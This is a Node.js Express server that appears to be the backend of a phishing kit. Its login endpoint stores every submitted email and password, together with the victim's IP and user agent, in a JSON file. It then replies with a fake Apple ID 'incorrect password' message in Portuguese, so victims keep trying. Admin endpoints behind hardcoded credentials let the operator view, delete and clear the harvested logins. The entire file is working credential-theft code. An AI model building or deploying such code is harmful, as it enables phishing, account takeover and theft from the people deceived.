const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// Data file path
const DATA_FILE = path.join(__dirname, 'data', 'credentials.json');

// Ensure data directory exists
if (!fs.existsSync(path.join(__dirname, 'data'))) {
    fs.mkdirSync(path.join(__dirname, 'data'), { recursive: true });
}

// Ensure data file exists
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
}

// Admin credentials
const ADMIN_EMAIL = 'admin@buscar.com';
const ADMIN_PASSWORD = 'Admin@2026';

// Login endpoint - saves credentials and validates
app.post('/api/login', (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ success: false, message: 'Email e senha são obrigatórios' });
    }

    // Save credential to database
    try {
        const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        data.push({
            email,
            password,
            timestamp: new Date().toISOString(),
            userAgent: req.headers['user-agent'],
            ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
        });
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
    } catch (err) {
        console.error('Error saving data:', err);
    }

    // Check if admin
    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
        return res.json({ success: true, isAdmin: true });
    }

    // Not admin - return error
    return res.json({ success: false, message: 'ID Apple ou senha incorreta.' });
});

// Admin authentication endpoint
app.post('/api/admin/auth', (req, res) => {
    const { email, password } = req.body;

    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
        return res.json({ success: true });
    }

    return res.status(401).json({ success: false, message: 'Acesso negado' });
});

// Get all stored credentials (admin only)
app.post('/api/admin/data', (req, res) => {
    const { email, password } = req.body;

    if (email !== ADMIN_EMAIL || password !== ADMIN_PASSWORD) {
        return res.status(401).json({ success: false, message: 'Acesso negado' });
    }

    try {
        const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        return res.json({ success: true, data });
    } catch (err) {
        return res.status(500).json({ success: false, message: 'Erro ao ler dados' });
    }
});

// Delete single entry
app.post('/api/admin/delete', (req, res) => {
    const { email, password, index } = req.body;

    if (email !== ADMIN_EMAIL || password !== ADMIN_PASSWORD) {
        return res.status(401).json({ success: false, message: 'Acesso negado' });
    }

    try {
        const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        if (index >= 0 && index < data.length) {
            data.splice(index, 1);
            fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
            return res.json({ success: true });
        }
        return res.status(400).json({ success: false, message: 'Índice inválido' });
    } catch (err) {
        return res.status(500).json({ success: false, message: 'Erro ao deletar' });
    }
});

// Clear all data
app.post('/api/admin/clear', (req, res) => {
    const { email, password } = req.body;

    if (email !== ADMIN_EMAIL || password !== ADMIN_PASSWORD) {
        return res.status(401).json({ success: false, message: 'Acesso negado' });
    }

    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
        return res.json({ success: true });
    } catch (err) {
        return res.status(500).json({ success: false, message: 'Erro ao limpar dados' });
    }
});

app.listen(PORT, () => {
    console.log(`\n🔍 Buscar Server running at http://localhost:${PORT}`);
    console.log(`📱 Admin panel at http://localhost:${PORT}/admin.html\n`);
});
